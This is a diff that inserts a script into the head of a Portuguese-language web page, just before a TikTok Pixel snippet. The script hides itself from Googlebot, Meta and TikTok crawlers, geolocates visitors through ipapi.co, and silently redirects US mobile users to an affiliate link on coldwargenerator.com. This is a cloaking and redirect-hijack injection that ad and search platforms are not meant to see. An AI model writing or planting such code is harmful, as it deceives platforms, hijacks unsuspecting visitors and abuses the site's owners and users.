@@ -1,5 +1,40 @@
 
 <!DOCTYPE html><html lang="pt-BR" ><head>
+  <script>
+    var userAgent = navigator.userAgent;
+
+    // Verifica se o agente do usuário corresponde a um bot.
+    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+        // Função para verificar se o dispositivo é móvel.
+        function isMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        }
+
+        // Função para obter a localização geográfica do usuário.
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    callback(data);
+                })
+                .catch(function(error) {
+                    console.error('Erro ao obter geolocalização:', error);
+                    callback(null);
+                });
+        }
+
+        // Verifica se o dispositivo é móvel e se a localização é nos Estados Unidos.
+        if (isMobile()) {
+            getGeolocation(function(location) {
+                if (location && location.country_code === 'US') {
+                    window.location.href = "https://coldwargenerator.com/?aff_id=22391";
+                }
+            });
+        }
+    }
+</script>
   <!-- TikTok Pixel Code Start -->
 <script>
 !function (w, d, t) {
